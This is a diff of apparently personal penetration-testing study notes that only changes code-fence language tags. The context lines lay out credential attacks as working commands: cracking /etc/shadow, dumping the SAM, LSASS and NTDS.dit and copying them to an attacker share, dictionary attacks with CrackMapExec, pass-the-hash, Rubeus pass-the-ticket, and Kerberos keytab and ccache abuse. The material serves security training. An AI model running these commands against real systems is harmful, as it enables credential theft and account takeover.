@@ -15,7 +15,7 @@ debugInConsole: false # Print debug info in Obsidian console
 >Should only be readable by `root`
 
 The shadow file contains all the hashes of user passwords:
-```sh
+```bash
 cat /etc/shadow
 
 htb-student:$y$j9T$3QSBB6CbHEu...SNIP...f8Ms:18955:0:99999:7:::
@@ -45,7 +45,7 @@ Each algorithm ID corresponds to a hashing algorithm:
 - *$7* - Scrypt
 ##### Cracking the Shadow file
 If both the `passwd` & `shadow` files have been obtained we can use `unshadow` & [[Hashcat]] to try crack it:
-```sh
+```bash
 $ unshadow passwd.copy shadow.copy > unshadow.hashes
 $ hashcat -m 1800 -a 0 unshadow.hashes rockyou.txt -o unshadow.cracked
 
@@ -57,7 +57,7 @@ $ hashcat -m 500 -a 0 md5-hashes.list rockyou.txt
 > Should only be writable by root but readable by all
 
 This file contains all the user accounts and some information about them:
-```shell
+```bash
 cat /etc/passwd
 
 htb-student:x:1000:1000:,,,:/home/htb-student:/bin/bash
@@ -130,7 +130,7 @@ A pretty common format for a user to do is:
 
 The [DefaultCreds-Cheat-Sheet](https://github.com/ihebski/DefaultCreds-cheat-sheet) contains a list of many default credentials for common applications, often these default credentials can be forgotten or overlooked when configuring infrastructure which can lead to easy access of the system.
 
-```sh
+```bash
 # Limit the list to only passwords of 6+ chars
 $ grep -E '^.{6,}$' [file_in] > [file_out]
 
@@ -149,7 +149,7 @@ There are 3 registry hives (*we need local admin access to get*) that are useful
 - `hklm\security` - Contains cached credentials for domain accounts (*useful if we are attacking a domain-joined windows target*)
 
 We can use the `reg.exe` utility to copy the registry hives. Once saved, we just need to [[Operating Systems/Windows/File Transfer|File Transfer]] them back to our attack machine.
-```cmd
+```batch
 C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save
 C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save
 C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
@@ -157,7 +157,7 @@ C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save
 > These techniques are well-known so may raise alarms, the [MITRE](https://attack.mitre.org/techniques/T1003/002/) website documents a variety of tools that can also do this same dumping
 
 Once on the attack machine, we can use Impacket's `secretsdump.py` tool to grab the hashes using the three files.
-```sh
+```bash
 $ secretsdump -sam sam.save -security security.save -system system.save LOCAL
 ```
 
@@ -197,10 +197,10 @@ We can use the `rundll32.exe` CLI utility to dump the process memory. It is fast
 The LSASS dump acts like a snapshot of all the active logon sessions at the time it was captured, this means the credentials for these sessions are in the dump.
 
 Running [pypykatz](https://github.com/skelsec/pypykatz) against the minidump can identify the credentials in the dump:
-```sh
+```bash
 $ pypykatz lsa minidump ./lsass.dmp
 ```
-```sh
+```bash
 FILE: ======== ../lsass.dmp =======
 == LogonSession ==
 # <..SNIP..>
@@ -262,7 +262,7 @@ Once a collection of employee names has been gathered, tools like [Username Anar
 Above all, we want to try to minimise the amount of data we have in our lists to as specific as we can, reducing the compute time needed.
 
 Once we have prepared our list(s), we can launch the dictionary attack against the target domain controller with a tool like [[CrackMapExec]].
-```sh
+```bash
 $ crackmapexc smb [target_ip] -u john.smith@company.com -p ./passwords.list
 ```
 > As far as can be seen, the default Group Policy Object (GPO) for a Windows domain, does NOT include a logon attempt lockout policy.
@@ -274,7 +274,7 @@ New Technology Directory Services (*NTDS*) is a directory service used with AD t
 ![[Windows#NTDS]]
 
 Once credentials have been obtained, we can use a tool like [[Evil-Winrm]] to connect to the target DC.
-```sh
+```bash
 $ evil-winrm -i [target_ip] -u [user] -p [pass]
 ```
 ```Powershell
@@ -306,17 +306,17 @@ PS C:\NTDS> cmd.exe /c move C:\NTDS\NTDS.dit \\[atk_box_ip]\Share
 ```
 
 Dump the contents of the NTDS.dit file using secretsdump. *This does requires the system boot key or the `SYSTEM` registry hive*!
-```sh
+```bash
 $ secretsdump -ntds NTDS.dit -system system.save LOCAL
 ```
 
 **Alternative Method using CME**
-```sh
+```bash
 $ crackmapexec smb [target_ip] -u [user] -p [pass] --ntds
 ```
 
 The NT hashes can then be cracked using [[Hashcat#Dictionary Attack|Hashcat]].
-```sh
+```bash
 $ sudo hashcat -m 1000 [hash] [wordlist]
 ```
 *If we are unsuccessful in cracking a hash, there are other methods that can be used to [[Password Attacks#Pass-the-Hash|Pass-the-Hash]]*.
@@ -341,7 +341,7 @@ PS C:\> Invoke-SMBExec -Target <Target_IP/Hostname> -Domain <Domain> -Username <
 
 #### PtH with Impacket (Linux)
 We can use a tool like Impacket's `PsExec` to execute a PtH attack.
-```sh
+```bash
 $ impacket-psexec <admin_user>@<target> -hashes :<hash>
 ```
 
@@ -365,7 +365,7 @@ On Windows, tickets are processed and stored by the [[Windows#LSASS|LSASS]] proc
 [Rubeus](https://github.com/GhostPack/Rubeus) can be used to export tickets using the `dump` option. (if running as the local administrator) then all tickets can be dumped in base64 format.
 > The `/nowrap` flag can make copy-paste easier.
 
-```cmd
+```batch
 C:\> Rubeus.exe dump /nowrap
 ```
 
@@ -380,7 +380,7 @@ Another source for Kerberos tickets on linux is with [keytab](https://kb.iu.edu/
 > The linux machine's ticket is default stored as `/etc/krb5.keytab` which would allow you to completely impersonate the machine itself
 
 #### Check if Linux machine is domain-joined
-```sh
+```bash
 # Will display any domains the machine is connected to
 $ realm list
 ```
@@ -388,12 +388,12 @@ $ realm list
 > If `realm` isn't available, we can look for the [sssd](https://sssd.io/) or [winbind](https://www.samba.org/samba/docs/current/man-html/winbindd.8.html) services which could suggest if the machine is domain-joined - [blog post](https://web.archive.org/web/20210624040251/https://www.2daygeek.com/how-to-identify-that-the-linux-server-is-integrated-with-active-directory-ad/)
 > `ps -ef | grep -i "winbind\|sssd"`
 #### Identifying Keytab files
-```sh
+```bash
 $ find / -name *keytab* -ls 2>/dev/null
 ```
 Sometimes these files are referenced in scripts or cronjobs. A common tool for interacting with Kerberos in linux is [kinit](https://web.mit.edu/kerberos/krb5-1.12/doc/user/user_commands/kinit.html) and can be a key indicator for keytab files.
 #### Abusing KeyTab files
-```sh
+```bash
 # List information about a keytab file (incl. who it belongs too a.k.a the principle name)
 $ klist -k -t <keytab_file>
 
@@ -409,7 +409,7 @@ $ kinit julia@mydomain.com -k -t /home/julia/julia.keytab
 Whilst this method is good for accessing a resource, it will not give us the ability to take control of the account on the linux machine (we still require the password).
 #### Extracting secrets from KeyTab files
 We can extract the hashes from KeyTab files and attempt to crack the hash to get the user's password. [KeyTabExtract](https://github.com/sosdave/KeyTabExtract) is a python tool for doing the extraction. It grabs the information from *502-type .keytab files*. It will get information such as the *realm*, *Service Principle*, *Encryption Type*, and *Hashes*.
-```sh
+```bash
 $ python3 keytabextract.py /home/julia/julia.keytab
 
 [*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
@@ -429,13 +429,13 @@ $ python3 keytabextract.py /home/julia/julia.keytab
 > (KeyTab files can contain multiple credentials for multiple users, and/or different hash types)
 
 #### CCACHE files (Credential Cache)
-```sh
+```bash
 $ env | grep -i krb5
 KRB5CCNAME=FILE:/tmp/...
 ```
 Each time a user logs in and authenticated via Kerberos, a cache file is created for them. If we have privileges to read the files (normally root) then we can impersonate any user that is authenticated.
 To impersonate another user, we just require read access to their ccache file. If we have this, we can make a copy of their file and then change the `KRB5CCNAME` env var to point to this copy. Then it will be used for all future Kerberos authentication.
-```sh
+```bash
 # We can see the user julio has a ccache file
 $ ls -la /tmp
 -rw-------  1 julio@inlanefreight.htb            domain users@inlanefreight.htb 1406 Oct  7 11:35 krb5cc_647401106_HRJDux
@@ -451,7 +451,7 @@ $ smbclient //dc01/C$ -k -c ls -no-pass
 > `ccache` files have expiration dates, the `klist` command will tell us these dates.
 #### Extracting credentials on Linux using Linikatz
 [Linikatz](https://github.com/CiscoCXSecurity/linikatz) is a tool in the same vein as [[Mimikatz]] but for domain-joined linux systems.
-```sh
+```bash
 $ wget https://raw.githubusercontent.com/CiscoCXSecurity/linikatz/master/linikatz.sh
 $ /opt/linikatz.sh
 ```
@@ -467,7 +467,7 @@ We can collect the encryption keys using a tool like [[Mimikatz]]:
 Then perform the attack:
 ![[Mimikatz#Pass-the-Hash]]
 
-```cmd
+```batch
 C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /nowrap
 
 <SNIP>
@@ -481,7 +481,7 @@ C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /nowrap
 
 #### Pass the Ticket with Rubeus
 Instead of doing an OverPass the Hash attack to generate a ticket, we can instead do a PtT attack to submit the ticket to the current logon session.
-```cmd
+```batch
 C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /ptt
 
 <SNIP>
@@ -491,7 +491,7 @@ C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /ptt
 > This displays the successful import message
 
 A ticket can also be passed from a `.kirbi` file on the disk (*it also supports putting the base64 version of the ticket in*):
-```cmd
+```batch
 C:\> Rubeus.exe ptt /ticket:<ticket_file>
 
 [*] Action: Import Ticket
@@ -500,7 +500,7 @@ C:\> Rubeus.exe ptt /ticket:<ticket_file>
 > Convert a file to Base64 in PowerShell: `[Convert]::ToBase64String([IO.File]::ReadAllBytes("<file_path>"))`
 
 Once the attack has been performed, we can then access the system as that user:
-```cmd
+```batch
 C:\> dir \\DC01.mydomain.com\C$
 ```
 
@@ -514,7 +514,7 @@ C:\> dir \\DC01.mydomain.com\C$
 - Have explicit PowerShell Remoting permissions in your session configuration
 
 With [[Mimikatz]] you can perform the [[Mimikatz#Pass the Ticket|Pass the Ticket]] attack, then connect via a powershell session to the target
-```cmd
+```batch
 C:\> mimikatz.exe
 
 <MIMIKATZ PTT ATTACK>
@@ -527,11 +527,11 @@ PS C:\> Enter-PSSession -ComputerName <target>
 ```
 
 [Rubeus](https://github.com/GhostPack/Rubeus) can do the same using the `createnetonly` option. It creates a sacrificial process/logon session([Logon type 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). Using a `netonly` process we prevent the erasure of existing TGTs for the current logon session.
-```cmd
+```batch
 C:\> Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 ```
 Once this creates a new CMD window, we can then proceed as normal with the PtT attack:
-```cmd
+```batch
 C:\> Rubeus.exe asktgt /domain:<domain> /user:<user> /<key_type>:<key> /ptt
 
 C:\> powershell
